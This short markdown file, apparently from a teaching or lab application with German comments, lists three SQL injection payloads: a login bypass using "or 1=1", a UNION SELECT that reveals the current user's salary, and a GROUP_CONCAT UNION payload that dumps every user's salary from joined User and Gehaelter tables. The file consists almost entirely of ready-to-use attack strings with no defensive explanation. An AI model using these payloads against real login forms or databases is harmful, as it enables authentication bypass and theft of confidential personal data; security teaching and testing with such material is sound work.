#Login Bypass and SQL Injection Examples

## Login Bypass Example

admin' or 1=1 --

## Login Bypass with UNION SELECT Example (zeigt ein Gehalt des aktuellen Users an)

admin' UNION SELECT username, email, position, gehalt FROM User JOIN Gehaelter ON User.id = Gehaelter.user_id --

## SQL Injection with UNION SELECT and GROUP_CONCAT Example (zeigt alle Gehälter an)

' UNION SELECT GROUP_CONCAT(username || ': ' || gehalt || '€', ' | '), 'Alle Gehälter', 'angezeigt', 'hier' FROM User
JOIN Gehaelter ON User.id = Gehaelter.user_id --


